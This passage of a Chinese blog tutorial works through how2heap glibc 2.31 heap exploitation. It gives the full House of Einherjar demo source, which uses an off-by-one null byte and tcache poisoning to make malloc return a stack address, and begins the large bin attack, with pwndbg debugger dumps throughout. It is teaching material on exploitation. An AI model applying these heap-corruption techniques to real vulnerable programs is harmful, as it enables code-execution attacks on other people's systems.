class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>我们通过修改 chunk d 的内容来达到 修改 chunk b 的 fd 指针的目的，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">   <span class="number">126</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">127</span>     d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line">   <span class="number">128</span></span><br><span class="line">   <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line"> ► <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">   <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line">   <span class="number">134</span></span><br><span class="line">   <span class="number">135</span>     <span class="comment">// sanity check</span></span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe210</span> ◂— <span class="number">0x700000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe218</span> ◂— <span class="number">0x2800000007</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe220</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe228</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x555555554040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe230</span> —▸ <span class="number">0x555555559310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe238</span> —▸ <span class="number">0x555555559308</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe240</span> ◂— <span class="number">0x60</span> <span class="comment">/* &#x27;`&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe248</span> —▸ <span class="number">0x5555555592b0</span> ◂— <span class="number">0x0</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555571</span>e main+<span class="number">1269</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x00007fffffffe260</span><span class="number">0x0000555555559010</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span></span><br></pre></td></tr></table></figure><p>最后我们只需两次 malloc 就能拿到目标地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line">  <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">► <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br></pre></td></tr></table></figure><p>完整代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This modification to The House of Enherjar works with the tcache-option enabled on glibc-2.31.</span></span><br><span class="line"><span class="comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">     * It has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">     * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *) &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">    a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">    a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *b = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *c = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>* c_size_ptr = (<span class="keyword">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">    b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">           <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">           <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">    *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">    a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tcache poisoning</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">    d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(e == stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-large-bin-attack"><a href="#5-large-bin-attack" class="headerlink" title="5. large_bin_attack"></a>5. large_bin_attack</h3><p>通过该技术向目标地址写入一个大值</p><p>2.30 之后关于 largs bin 的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加了两个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted </span></span><br><span class="line"><span class="string">(nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>导致传统的 large bin attack 没法使用</p><p>但是存在一个新的利用路径: </p><p>首先布置如下的 heap </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x430</span>                Used                None              None</span><br><span class="line"><span class="number">0x5555555596c0</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555596e0</span>      <span class="number">0x0</span>                 <span class="number">0x420</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b00</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>0x20 的为  guard chunk ，避免 free 之后 chunk 合并 , 然后我们free p1，此时 chunk p1 会放入 unsortedbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">54</span>   <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line">   <span class="number">55</span></span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line"> ► <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">   <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">64</span></span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe280</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe288</span> —▸ <span class="number">0x5555555592a0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555559b20</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe290</span> —▸ <span class="number">0x5555555596d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe298</span> —▸ <span class="number">0x5555555596f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe2a0</span> —▸ <span class="number">0x555555559b10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe2a8</span> —▸ <span class="number">0x555555555140</span> (_start) ◂— endbr64</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe2b0</span> —▸ <span class="number">0x7fffffffe3b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe2b8</span> ◂— <span class="number">0xf7624ffb64d1fe00</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">5555555553f</span>a main+<span class="number">465</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span 